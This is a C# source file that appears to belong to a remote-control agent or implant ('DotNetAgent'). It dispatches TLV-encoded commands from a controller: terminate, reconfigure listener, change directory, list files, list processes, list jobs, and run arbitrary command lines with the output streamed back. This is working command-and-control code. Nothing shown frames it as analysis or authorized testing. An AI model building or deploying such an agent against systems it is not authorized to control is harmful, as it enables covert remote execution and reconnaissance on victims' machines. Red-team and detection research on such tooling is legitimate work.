using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using static DotNetAgent.MessagesManager;

namespace DotNetAgent
{
    internal class NativeCommand
    {
        private const int COMMAND_TYPE_DIE = 0x1;
        private const int COMMAND_TYPE_LISTENER_CONF = 0x2;
        private const int COMMAND_TYPE_CD = 0x3;
        private const int COMMAND_TYPE_LS = 0x4;
        private const int COMMAND_TYPE_PS = 0x5;
        private const int COMMAND_TYPE_JOBS = 0x6;
        private const int COMMAND_TYPE_RUN = 0x7;

        private const byte TLV_COMMAND_ID = 0x1;
        private const byte TLV_COMMAND_TYPE = 0x2;
        private const byte TLV_COMMAND_CONF = 0x3;
        private const byte TLV_CONF_LISTENER_CONF_BLOB = 0x2;
        private const byte TLV_CONF_PATH = 0x1;
        private const byte TLV_CONF_DEPTH = 0x2;
        private const byte TLV_CONF_CMDLINE = 0x1;
        private const byte TLV_CONF_GET_OUTPUT = 0x2;
        private const byte TLV_RESULT_PATH = 0x10;
        private const byte TLV_RESULT_OUTER = 0x1;
        private const byte TLV_RESULT_CMD_ID = 0x1;
        private const byte TLV_RESULT_PID = 0x2;

        public static void NewNativeCommand(TLV tlv)
        {
            Logger.Info("New native command TLV");
            if (!tlv.HasChild(TLV_COMMAND_ID) || !tlv.HasChild(TLV_COMMAND_TYPE))
            {
                Logger.Warning("Missing mandatory fields in native command TLV");
                return;
            }
            uint commandId = tlv.GetChild(TLV_COMMAND_ID).GetAsUInt32();
            uint commandType = tlv.GetChild(TLV_COMMAND_TYPE).GetAsUInt32();
            TLV confTlv = (tlv.HasChild(TLV_COMMAND_CONF) ? tlv.GetChild(TLV_COMMAND_CONF) : null);

            RunningCommandsManager.RegisterCommand(commandId, new RunningCommandsManager.RunningCommandInfo
            {
                Thread = Thread.CurrentThread,
                IsPlugin = false
            });
            try
            {
                switch (commandType)
                {
                    case COMMAND_TYPE_DIE:
                        CommandDie();
                        return;
                    case COMMAND_TYPE_LISTENER_CONF:
                        CommandListenerConf(commandId, confTlv);
                        return;
                    case COMMAND_TYPE_CD:
                        CommandCd(commandId, confTlv);
                        return;
                    case COMMAND_TYPE_LS:
                        CommandLs(commandId, confTlv);
                        return;
                    case COMMAND_TYPE_PS:
                        CommandPs(commandId, confTlv);
                        return;
                    case COMMAND_TYPE_JOBS:
                        CommandJobs(commandId);
                        return;
                    case COMMAND_TYPE_RUN:
                        CommandRun(commandId, confTlv);
                        return;
                    default:
                        Logger.Info("Unknown native command");
                        MessagesManager.NewResult(commandId, null, CommandStatus.FAILED, Encoding.UTF8.GetBytes("Not supported native command"));
                        return;
                }
            }
            finally
            {
                RunningCommandsManager.UnregisterCommand(commandId);
            }
        }

        private static void CommandDie()
        {
            Logger.Info("I will die now");
            Environment.Exit(0);
        }

        private static void CommandListenerConf(uint commandId, TLV conf)
        {
            try
            {
                if (!conf.HasChild(TLV_CONF_LISTENER_CONF_BLOB))
                {
                    MessagesManager.NewResult(commandId, null, CommandStatus.FAILED, Encoding.UTF8.GetBytes("Bad conf"));
                    return;
                }
                byte[] blob = conf.GetChild(TLV_CONF_LISTENER_CONF_BLOB).GetAsBytes();
                ListenerManager.SendMessageToSingleListener(blob);
                MessagesManager.NewResult(commandId, Encoding.UTF8.GetBytes("OK"), CommandStatus.SUCCESS, null);
            }
            catch (Exception ex)
            {
                MessagesManager.NewResult(commandId, null, CommandStatus.FAILED, Encoding.UTF8.GetBytes(ex.Message));
            }
        }

        private static void CommandCd(uint commandId, TLV conf)
        {
            try
            {
                if (!conf.HasChild(TLV_CONF_PATH))
                {
                    MessagesManager.NewResult(commandId, null, CommandStatus.FAILED, Encoding.UTF8.GetBytes("Bad conf"));
                    return;
                }
                Directory.SetCurrentDirectory(conf.GetChild(TLV_CONF_PATH).GetAsString());
                Metadata.Update();
                MessagesManager.NewResult(commandId, Encoding.UTF8.GetBytes(Directory.GetCurrentDirectory()), CommandStatus.SUCCESS, null);
            }
            catch (Exception ex)
            {
                MessagesManager.NewResult(commandId, null, CommandStatus.FAILED, Encoding.UTF8.GetBytes(ex.Message));
            }
        }

        private static void CommandLs(uint commandId, TLV conf)
        {
            try
            {
                if (conf == null || !conf.HasChild(TLV_CONF_PATH))
                {
                    MessagesManager.NewResult(commandId, null, CommandStatus.FAILED, Encoding.UTF8.GetBytes("Missing configuration or directory parameter"));
                    return;
                }

                string pathSpec = conf.GetChild(TLV_CONF_PATH).GetAsString();
                uint depth = conf.HasChild(TLV_CONF_DEPTH)
                    ? conf.GetChild(TLV_CONF_DEPTH).GetAsUInt32()
                    : 1;

                TLV resultTlv = new TLV(TLV_COMMAND_CONF);
                if (!NativeCommandLsHelper.ListDirFiles(pathSpec, depth, resultTlv, out string enumerationDirectory))
                {
                    MessagesManager.NewResult(commandId, null, CommandStatus.FAILED, Encoding.UTF8.GetBytes("Failed to list directory"));
                    return;
                }

                resultTlv.AddChild(new TLV(TLV_RESULT_PATH, Encoding.UTF8.GetBytes(enumerationDirectory ?? "")));
                MessagesManager.NewResult(commandId, resultTlv.GetFullBuffer(), CommandStatus.SUCCESS, null);
            }
            catch (Exception ex)
            {
                MessagesManager.NewResult(commandId, null, CommandStatus.FAILED, Encoding.UTF8.GetBytes(ex.Message));
            }
        }

        private static void CommandPs(uint commandId, TLV conf)
        {
            try
            {
                TLV resultTlv = NativeCommandPsHelper.BuildProcessListTlv();
                MessagesManager.NewResult(commandId, resultTlv.GetFullBuffer(), CommandStatus.SUCCESS, null);
            }
            catch (Exception ex)
            {
                MessagesManager.NewResult(commandId, null, CommandStatus.FAILED, Encoding.UTF8.GetBytes(ex.Message));
            }
        }

        private static void CommandJobs(uint commandId)
        {
            TLV result = new TLV(TLV_RESULT_OUTER);
            int thisPid = Process.GetCurrentProcess().Id;
            foreach (uint id in RunningCommandsManager.GetRunningCommands())
            {
                TLV cmd = new TLV(TLV_RESULT_OUTER);
                cmd.AddChild(new TLV(TLV_RESULT_CMD_ID, BitConverter.GetBytes(id)));
                cmd.AddChild(new TLV(TLV_RESULT_PID, BitConverter.GetBytes(thisPid)));
                result.AddChild(cmd);
            }
            MessagesManager.NewResult(commandId, result.GetFullBuffer(), CommandStatus.SUCCESS, null);
        }

        private static void CommandRun(uint commandId, TLV conf)
        {
            try
            {
                string cmdline;
                bool getOutput = true;

                if (!conf.HasChild(TLV_CONF_CMDLINE))
                {
                    MessagesManager.NewResult(commandId, null, CommandStatus.FAILED, Encoding.UTF8.GetBytes("Bad conf"));
                    return;
                }
                cmdline = conf.GetChild(TLV_CONF_CMDLINE).GetAsString();

                if (conf.HasChild(TLV_CONF_GET_OUTPUT))
                {
                    getOutput = conf.GetChild(TLV_CONF_GET_OUTPUT).GetAsByte() > 0;
                }

                byte[] stderr;
                bool success = ProcessRunner.Run(cmdline, getOutput,
                    (chunk) => MessagesManager.NewResult(commandId, chunk, CommandStatus.ONGOING, null),
                    out stderr,
                    (processHandle) => RunningCommandsManager.SetCommandProcessHandle(commandId, processHandle));

                MessagesManager.NewResult(commandId, null,
                    success ? CommandStatus.SUCCESS : CommandStatus.FAILED,
                    stderr);
            }
            catch (Exception ex)
            {
                MessagesManager.NewResult(commandId, null, CommandStatus.FAILED, Encoding.UTF8.GetBytes(ex.Message));
            }
        }
    }
}
